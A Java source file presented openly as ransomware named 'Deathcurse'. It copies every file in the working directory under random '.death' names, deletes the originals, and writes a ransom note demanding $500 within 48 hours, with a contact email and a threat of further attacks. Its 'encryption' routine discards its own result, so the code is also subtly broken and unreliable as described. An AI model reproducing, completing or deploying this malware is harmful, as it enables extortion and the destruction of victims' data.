/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package deathcurse;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author K_Hacker
 */
public class Deathcurse {

    static String getRandomName(int length, String extend) {
        Random r = new Random();
        StringBuilder res = new StringBuilder();

        for (int i = 0; i < length; i++) {

            char c = 'a';
            int width = 'z' - 'a';

            if (r.nextInt(3) == 0) {
                c = 'A';
                width = 'Z' - 'A';
            }
            if (r.nextInt(3) == 1) {
                c = '0';
                width = '9' - '0';
            }

            res.append((char) (c + r.nextInt(width)));

        }

        res.append(".").append(extend);

        return res.toString();
    }
    public static void main(String[] args) throws IOException {      
        //public void listFiles(String folder){
        //File directory = new File(folder);
       //File[] contents = directory.listFiles();
        //for ( File f : contents) {
       // System.out.println(f.getAbsolutePath());
       //} D:\\test\\hyacker\\New folder
        String username = System. getProperty("user.name");
        File ff = new File("");
        String currentDirectory = System.getProperty("user.dir");
        File src = new File(ff.getAbsolutePath());
        File[] files = src.listFiles();

        System.out.println("{+} Encrypting......");

        for (File f : files) {
            try {
                Encrypting(f, src);
                f.delete();

            } catch (IOException ex) {
                Logger.getLogger(Deathcurse.class.getName()).log(Level.SEVERE, null, ex);
            }
        }  

        
        ff=new File("Notice.txt");
        FileWriter fw=new FileWriter(ff);
        PrintWriter pw=new PrintWriter(fw);
        pw.println("\t\t\tAttention!!! Your Fucking Data has been Encrypted...");
        pw.println("");
        pw.println("To recover your data, pay 500$ before 48 hour, if you don't then be ready for next Attack!");
          pw.println("");
          pw.println("");
          pw.println("Contact Me : predator0x300@gmail.com");
           pw.println("Your Infected Sys ID is :735cd47e595bc8c1277ed8b1470496804d77560a98061cf45342f0b41841faa7");
           pw.println("");
           pw.println("");
           pw.println("Visit: Corruptsec.net");pw.close();
  
        

    }

    static void Encrypting(File source, File dest) throws IOException {
        InputStream is = null;
        OutputStream os = null;

        dest = new File(dest.getPath().concat("/").concat(getRandomName(10, "death")));

        try {
            is = new FileInputStream(source);
            os = new FileOutputStream(dest);

            os.write(new byte[]{(byte) source.getName().length()});
            os.write(stringToByte(source.getName()));

            byte[] buffer = new byte[1024];

            int length;

            while ((length = is.read(buffer)) > 0) {
                encryptAlgorithme(buffer, 2, 1, 3);
                os.write(buffer, 0, length);
            }

        } finally {
            is.close();
            os.close();
        }
    }

    static byte[] stringToByte(String data) {
        char[] ca = data.toCharArray();
        byte[] res = new byte[ca.length * 2];

        for (int i = 0; i < res.length; i++) {
            res[i] = (byte) ((ca[i / 2] >> (8 - (i % 2) * 8)) & 0xff);
        }

        return res;
    }

    static byte[] encryptAlgorithme(byte[] data, int a, int b, int c) {
        byte[] enc = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            if (i % a == 0) {
                enc[i] = (byte) (data[i] + b);
            } else {
                enc[i] = (byte) (data[i] - c);
            }
        }

        return enc;
    }
}
